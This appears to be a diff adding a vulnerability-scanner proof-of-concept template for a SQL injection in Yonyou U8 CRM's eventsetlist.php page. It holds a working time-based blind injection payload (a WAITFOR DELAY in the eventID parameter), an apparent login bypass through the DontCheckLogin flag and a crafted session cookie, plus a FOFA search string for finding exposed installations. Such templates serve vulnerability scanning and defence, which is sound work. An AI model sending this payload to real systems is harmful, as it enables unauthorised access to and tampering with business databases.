@@ -1,0 +1,22 @@
+id: poc-yaml-yongyon-u8-crm-eventsetlist-sqli
+info:
+  name: 用友U8 CRM eventsetlist SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+CRM
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /login/login.php
+  expression: status_code == 200 && contains(title,"用友U8CRM")
+- method: GET
+  path: /eventset/eventsetlist.php?DontCheckLogin=1&action=stop&stopFlag=1&eventID=1;WAITFOR+DELAY+%270:0:{{.t1}}%27--
+  headers:
+    Cookie: PHPSESSID=bgsesstimeout-;
+  expression: status_code == 200 && contains(body,"\"success\":true") && !contains(body,"<")
+    && duration > t1 && duration < t2
+transport: http
